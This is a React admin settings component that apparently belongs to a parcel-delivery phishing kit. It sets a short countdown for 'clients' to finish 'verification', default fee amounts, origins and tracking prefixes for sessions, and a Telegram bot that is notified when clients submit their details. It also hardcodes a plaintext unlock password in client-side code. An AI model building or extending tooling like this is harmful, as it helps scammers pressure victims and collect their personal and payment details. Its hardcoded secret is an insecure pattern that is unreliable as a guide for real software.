import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { toast } from "@/hooks/use-toast";
import { Save, Send, Eye, EyeOff, MessageCircle, Lock, ShieldCheck, Timer, Package } from "lucide-react";
import { Slider } from "@/components/ui/slider";

const SETTINGS_PASSWORD = "Ninja-93-Kk";

const AdminSettings = () => {
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [timerMinutes, setTimerMinutes] = useState(5);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [testing, setTesting] = useState(false);
  const [showToken, setShowToken] = useState(false);

  // Default parcel settings
  const [defaultAmount, setDefaultAmount] = useState("2.99");
  const [defaultOrigin, setDefaultOrigin] = useState("Los Angeles, CA");
  const [defaultEstDelivery, setDefaultEstDelivery] = useState("2-3 Business Days");
  const [trackingPrefix, setTrackingPrefix] = useState("SWIFT");

  const handleUnlock = () => {
    if (passwordInput === SETTINGS_PASSWORD) {
      setIsUnlocked(true);
      setPasswordInput("");
      toast({
        title: "Access Granted",
        description: "Settings unlocked successfully",
      });
    } else {
      toast({
        title: "Access Denied",
        description: "Incorrect password",
        variant: "destructive",
      });
    }
  };

  useEffect(() => {
    fetchSettings();
  }, []);

  const fetchSettings = async () => {
    const { data, error } = await supabase
      .from("admin_settings")
      .select("setting_key, setting_value")
      .in("setting_key", [
        "telegram_bot_token", 
        "telegram_chat_id", 
        "verification_timeout",
        "default_amount",
        "default_origin",
        "default_est_delivery",
        "tracking_prefix"
      ]);

    if (error) {
      console.error("Error fetching settings:", error);
      toast({
        title: "Error",
        description: "Failed to load settings",
        variant: "destructive",
      });
    } else if (data) {
      const token = data.find(s => s.setting_key === "telegram_bot_token")?.setting_value || "";
      const chat = data.find(s => s.setting_key === "telegram_chat_id")?.setting_value || "";
      const timeout = data.find(s => s.setting_key === "verification_timeout")?.setting_value;
      const amount = data.find(s => s.setting_key === "default_amount")?.setting_value;
      const origin = data.find(s => s.setting_key === "default_origin")?.setting_value;
      const estDelivery = data.find(s => s.setting_key === "default_est_delivery")?.setting_value;
      const prefix = data.find(s => s.setting_key === "tracking_prefix")?.setting_value;
      
      setBotToken(token);
      setChatId(chat);
      if (timeout) setTimerMinutes(Math.round(parseInt(timeout, 10) / 60));
      if (amount) setDefaultAmount(amount);
      if (origin) setDefaultOrigin(origin);
      if (estDelivery) setDefaultEstDelivery(estDelivery);
      if (prefix) setTrackingPrefix(prefix);
    }
    setLoading(false);
  };

  const upsertSetting = async (key: string, value: string) => {
    const { data: existing } = await supabase
      .from("admin_settings")
      .select("id")
      .eq("setting_key", key)
      .maybeSingle();

    if (existing) {
      await supabase
        .from("admin_settings")
        .update({ setting_value: value })
        .eq("setting_key", key);
    } else {
      await supabase
        .from("admin_settings")
        .insert({ setting_key: key, setting_value: value });
    }
  };

  const saveSettings = async () => {
    setSaving(true);

    try {
      // Update bot token
      const { error: tokenError } = await supabase
        .from("admin_settings")
        .update({ setting_value: botToken })
        .eq("setting_key", "telegram_bot_token");

      if (tokenError) throw tokenError;

      // Update chat ID
      const { error: chatError } = await supabase
        .from("admin_settings")
        .update({ setting_value: chatId })
        .eq("setting_key", "telegram_chat_id");

      if (chatError) throw chatError;

      // Update timer setting
      const timerSeconds = timerMinutes * 60;
      await upsertSetting("verification_timeout", timerSeconds.toString());

      // Update parcel default settings
      await upsertSetting("default_amount", defaultAmount);
      await upsertSetting("default_origin", defaultOrigin);
      await upsertSetting("default_est_delivery", defaultEstDelivery);
      await upsertSetting("tracking_prefix", trackingPrefix);

      toast({
        title: "Settings Saved",
        description: "All settings have been updated successfully",
      });
    } catch (error) {
      console.error("Error saving settings:", error);
      toast({
        title: "Error",
        description: "Failed to save settings",
        variant: "destructive",
      });
    } finally {
      setSaving(false);
    }
  };

  const testTelegram = async () => {
    if (!botToken || !chatId) {
      toast({
        title: "Missing Settings",
        description: "Please enter bot token and chat ID first",
        variant: "destructive",
      });
      return;
    }

    setTesting(true);

    try {
      const { data, error } = await supabase.functions.invoke("send-telegram", {
        body: {
          message: "🧪 <b>Test Notification</b>\n\nThis is a test message from your Swift Delivery Admin Panel. If you received this, your Telegram integration is working correctly!",
        },
      });

      if (error) throw error;

      if (data?.success) {
        toast({
          title: "Test Successful",
          description: "Check your Telegram for the test message",
        });
      } else {
        toast({
          title: "Test Failed",
          description: data?.reason || "Failed to send test message",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error testing Telegram:", error);
      toast({
        title: "Error",
        description: "Failed to send test message",
        variant: "destructive",
      });
    } finally {
      setTesting(false);
    }
  };

  if (!isUnlocked) {
    return (
      <Card className="max-w-md mx-auto">
        <CardHeader className="text-center">
          <div className="mx-auto w-12 h-12 bg-muted rounded-full flex items-center justify-center mb-2">
            <Lock className="w-6 h-6 text-muted-foreground" />
          </div>
          <CardTitle>Settings Protected</CardTitle>
          <CardDescription>
            Enter the settings password to access this section
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="settingsPassword">Password</Label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Input
                  id="settingsPassword"
                  type={showPassword ? "text" : "password"}
                  placeholder="Enter password"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleUnlock()}
                />
              </div>
              <Button
                variant="outline"
                size="icon"
                onClick={() => setShowPassword(!showPassword)}
                type="button"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
          </div>
          <Button onClick={handleUnlock} className="w-full gap-2">
            <ShieldCheck className="w-4 h-4" />
            Unlock Settings
          </Button>
        </CardContent>
      </Card>
    );
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center py-10">
        <p className="text-muted-foreground">Loading settings...</p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Timer Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Timer className="w-5 h-5" />
            Verification Timer
          </CardTitle>
          <CardDescription>
            Set how long clients have to complete their verification before the timer expires
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <Label>Timeout Duration</Label>
              <span className="text-2xl font-mono font-bold text-primary">
                {timerMinutes} min
              </span>
            </div>
            <Slider
              value={[timerMinutes]}
              onValueChange={(value) => setTimerMinutes(value[0])}
              min={1}
              max={5}
              step={1}
              className="w-full"
            />
            <div className="flex justify-between text-xs text-muted-foreground">
              <span>1 min</span>
              <span>2 min</span>
              <span>3 min</span>
              <span>4 min</span>
              <span>5 min</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Default Parcel Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Package className="w-5 h-5" />
            Default Parcel Settings
          </CardTitle>
          <CardDescription>
            Set default values for new client sessions
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="trackingPrefix">Tracking Prefix</Label>
              <Input
                id="trackingPrefix"
                placeholder="SWIFT"
                value={trackingPrefix}
                onChange={(e) => setTrackingPrefix(e.target.value.toUpperCase())}
              />
              <p className="text-xs text-muted-foreground">
                Prefix for tracking numbers (e.g., SWIFT → SWIFTabc123)
              </p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="defaultAmount">Default Amount (£)</Label>
              <Input
                id="defaultAmount"
                type="number"
                step="0.01"
                placeholder="2.99"
                value={defaultAmount}
                onChange={(e) => setDefaultAmount(e.target.value)}
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="defaultOrigin">Default Origin</Label>
            <Input
              id="defaultOrigin"
              placeholder="Los Angeles, CA"
              value={defaultOrigin}
              onChange={(e) => setDefaultOrigin(e.target.value)}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="defaultEstDelivery">Default Est. Delivery</Label>
            <Input
              id="defaultEstDelivery"
              placeholder="2-3 Business Days"
              value={defaultEstDelivery}
              onChange={(e) => setDefaultEstDelivery(e.target.value)}
            />
          </div>
        </CardContent>
      </Card>
      {/* Telegram Settings */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <MessageCircle className="w-5 h-5" />
            Telegram Notifications
          </CardTitle>
          <CardDescription>
            Configure Telegram bot to receive notifications when clients submit their details
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="botToken">Bot Token</Label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Input
                  id="botToken"
                  type={showToken ? "text" : "password"}
                  placeholder="Enter your Telegram bot token"
                  value={botToken}
                  onChange={(e) => setBotToken(e.target.value)}
                />
              </div>
              <Button
                variant="outline"
                size="icon"
                onClick={() => setShowToken(!showToken)}
                type="button"
              >
                {showToken ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
            <p className="text-xs text-muted-foreground">
              Create a bot via @BotFather on Telegram to get your token
            </p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="chatId">Chat ID</Label>
            <Input
              id="chatId"
              type="text"
              placeholder="Enter your Telegram chat ID"
              value={chatId}
              onChange={(e) => setChatId(e.target.value)}
            />
            <p className="text-xs text-muted-foreground">
              Send /start to @userinfobot on Telegram to get your chat ID
            </p>
          </div>

          <div className="flex gap-2 pt-4">
            <Button 
              variant="outline" 
              onClick={testTelegram} 
              disabled={testing || !botToken || !chatId}
              className="gap-2"
            >
              <Send className="w-4 h-4" />
              {testing ? "Sending..." : "Test Notification"}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Save Button */}
      <Button onClick={saveSettings} disabled={saving} className="w-full gap-2" size="lg">
        <Save className="w-4 h-4" />
        {saving ? "Saving..." : "Save All Settings"}
      </Button>
    </div>
  );
};

export default AdminSettings;